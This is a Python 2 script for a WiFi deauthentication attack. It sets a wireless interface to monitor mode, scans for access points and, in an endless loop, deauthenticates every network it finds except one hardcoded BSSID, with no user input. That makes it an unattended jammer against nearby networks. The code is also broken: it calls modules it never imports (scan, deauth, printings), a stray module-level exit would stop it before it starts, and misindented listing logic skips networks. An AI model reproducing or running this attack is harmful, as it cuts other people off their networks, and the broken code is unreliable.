#!/usr/bin/env python
import netifaces
from scapy.all import *
import nfqueue
import nmap
import sys
import os
import signal
import subprocess
from threading import Thread
from time import sleep
import datetime
import logging

logging.getLogger("scapy.runtime").setLevel(logging.ERROR) # scapy, please shut up..

# terminal colors
RED = "\033[1;31m"  
BLUE = "\033[1;34m"
CYAN = "\033[1;36m"
GREEN = "\033[1;32m"
YELLOW = "\33[1;93m"
NORMAL = "\033[0;0m"
BOLD = "\033[;1m"

def wifi_scan():
    '''
    This will perform a basic Access-Point scan.
    Informations like WPS, Encryption, Signal Strength, ESSID, ... will be shown for every available AP.
    The function uses 'scan.py' located in the local 'build' folder.
    '''

    interface = get_interface()
    enable_mon_mode(interface)

    wifiscan = scan.WifiScan(interface)
    wifiscan.do_output = True

    hopT = Thread(target=wifiscan.channelhop, args=[])
    hopT.daemon = True
    hopT.start()

    # This decay is needed to avoid issues concerning the Channel-Hop-Thread
    sleep(0.2)
    
    try:
        wifiscan.do_scan()
    except socket.error:
        print("{R}ERROR: Network-Interface is down.{N}".format(R=RED, N=NORMAL))
sys.exit(0)


def get_interface():
   
    print("{Y}Select a suitable network interface:\n{N}".format(Y=YELLOW, N=NORMAL))
    available_interfaces = netifaces.interfaces()
    for x in range(len(available_interfaces)):
        print("   {N}[{R}{num}{N}] {iface}".format(N=NORMAL, R=RED, num=x+1, iface=available_interfaces[x]))
	print("\n")
    while True:
        raw_interface = 3;

        try:
            interface = int(raw_interface)
        except ValueError:
            print("{R}ERROR: Please enter a number.{N}".format(R=RED, N=NORMAL))
            continue

        if 0 < interface <= len(available_interfaces):
            return available_interfaces[interface-1]
        else:
            print("{R}ERROR: Wrong number.{N}".format(R=RED, N=NORMAL))

def enable_mon_mode(interface):
    # enable monitoring mode to capture and send packets

    try:
        subprocess.call("sudo ip link set {} down".format(interface), shell=True)
        mon = subprocess.Popen(["sudo", "iwconfig", interface, "mode", "monitor"], stderr=subprocess.PIPE)
        for line in mon.stderr:
            if "Error" in line:
                sys.exit("\n{R}The selected interface can't be used.{N}\n".format(R=RED, N=NORMAL))

        subprocess.call("sudo ip link set {} up".format(interface), shell=True)
    except Exception:
        sys.exit("\n{R}ERROR: Not able to activate monitor mode on selected interface.{N}\n".format(R=RED, N=NORMAL))

def enable_ip_forwarding():
    ipfwd = open('/proc/sys/net/ipv4/ip_forward', 'r+')
    ipfwd.write('1\n')
    ipfwd.close()

def disable_ip_forwarding():
    ipfwd = open('/proc/sys/net/ipv4/ip_forward', 'r+')
    ipfwd.write('0\n')
    ipfwd.close()

def get_gateway_ip():
    # get the 'default' gateway

    try:
        return netifaces.gateways()['default'][netifaces.AF_INET][0]
    except KeyError:
        print("\n{R}ERROR: Unable to retrieve gateway IP address.\n{N}".format(R=RED, N=NORMAL))
        return raw_input("Please enter gateway IP address manually: ")

def get_local_ip(interface):
    try:
        local_ip = netifaces.ifaddresses(interface)[netifaces.AF_INET][0]['addr']
        if local_ip == "127.0.0.1" or local_ip == "ff:ff:ff:ff:ff:ff":
            sys.exit("\n{R}ERROR: Invalid network interface.{N}\n".format(R=RED, N=NORMAL))
        return local_ip
    except KeyError:
        print("\n{R}ERROR: Unable to retrieve local IP address.{N}\n")
        return raw_input("Please enter your local IP address manually: ")

def get_mac_by_ip(ipaddr):
    # get the MAC by sending ARP packets to the desired IP

    ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ipaddr), retry=2, timeout=7)
    for snd, rcv in ans:
        try:
            return rcv[Ether].src
        except KeyError:
            print("\n{R}ERROR: Unable to retrieve MAC address from IP address: {N}{ip}\n".format(R=RED, N=NORMAL, ip=ipaddr))
            return raw_input("Please enter MAC address manually: ")
        
def deauth_attack():
		while True:
			interface = get_interface()
			enable_mon_mode(interface)

			wifiscan = scan.WifiScan(interface)
			wifiscan.do_output = False
			wifiscan.timeout = 8

			hopT = Thread(target=wifiscan.channelhop, args=[])
			hopT.daemon = True
			hopT.start()

			print("[{Y}*{N}] Searching for WiFi-Networks... (10 sec.)\n".format(Y=YELLOW, N=NORMAL))

			wifiscan.do_scan()
			wifiscan.channelhop_active = False
			access_points = wifiscan.get_access_points()

			if len(access_points) < 1:
					print("{R}No networks found :({N}".format(R=RED, N=NORMAL))
					sys.exit(0)

			print("{Y}Available networks:{N}\n".format(Y=YELLOW, N=NORMAL))

			ap_in =''
			num = 1
			for bssid in access_points.keys():
				space = 2
				if num > 9:
					space = 1

					essid = access_points[bssid]["essid"]
					access_points[bssid]["num"] = num
					print("   [{R}{num}{N}]{sp}{bssid} | {essid}".format(num=num, R=RED, N=NORMAL, bssid=bssid.upper(), essid=essid, sp=" "*space))
					if bssid.upper() != 'B4:A5:EF:05:0E:74':
						ap_in+=str(num)
						ap_in+=str(',')
					print ap_in;
					num += 1
			ap_in = ap_in[:-1]
			print("\nSeperate multiple targets with {R}','{N} (comma).".format(R=RED, N=NORMAL))

			while True:
					ap_in = ap_in.replace(" ", "")
					print ap_in
					if not "," in ap_in:
							ap_list_in = [ap_in]
					else:
							 ap_list_in = ap_in.split(",")

					if not all(x.isdigit() for x in ap_list_in) or not all(int(x) in range(len(access_points)+1) for x in ap_list_in):
							print("{R}ERROR: Invalid input.{N}".format(R=RED, N=NORMAL))
							break

					break

			
			printings.deauth_ap()

			ap_list = {}

			for bssid in access_points:
					for num in ap_list_in:
							if int(num) == access_points[bssid]["num"]:
									print(" ->   {bssid} | {essid}".format(bssid=bssid.upper(), essid=access_points[bssid]["essid"]))
									ap_list[bssid] = access_points[bssid]["ch"]

			print("\n")

			deauthent = deauth.Deauth(ap_list, interface)
			deauthent.start_deauth()
		sleep(120)

def main():
    # Signal handler to catch KeyboardInterrupts
    def signal_handler(signal, frame):
        print("")
        sys.exit(0)

    signal.signal(signal.SIGINT, signal_handler)

    deauth_attack()

if __name__ == "__main__":
    main()
